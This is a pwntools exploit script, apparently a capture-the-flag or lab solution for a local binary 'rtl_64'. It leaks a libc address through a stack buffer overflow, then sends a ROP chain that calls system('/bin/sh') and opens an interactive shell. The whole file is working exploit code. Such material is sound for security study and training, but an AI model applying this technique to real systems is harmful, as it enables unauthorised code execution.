from pwn import *
context.terminal=['tmux', 'splitw', '-h']
context.arch = "amd64"
p = process('./rtl_64')
rop = (0x0000000000027725)
binsh = (0x196031)
system = (0x4c330)
#main_ret = (0x000000000040119a)
main_ret = 0x00000000000270c2
#main_ret = 0x0000000000401016
libc_start_call_main = (0x27110)

p.recvuntil("BOF1\n")
payload = b"a"*72
p.send(payload)
p.recvuntil(payload)
ret = u64(p.recv(6)+b'\x00'*2)
print(ret)
payload += p64(ret - (libc_start_call_main+122) + rop)
payload += p64(ret - (libc_start_call_main+122) + binsh)
payload += p64(ret - (libc_start_call_main+122) + main_ret)
payload += p64(ret - (libc_start_call_main+122) + system)
p.sendafter("BOF2",payload)

p.interactive()


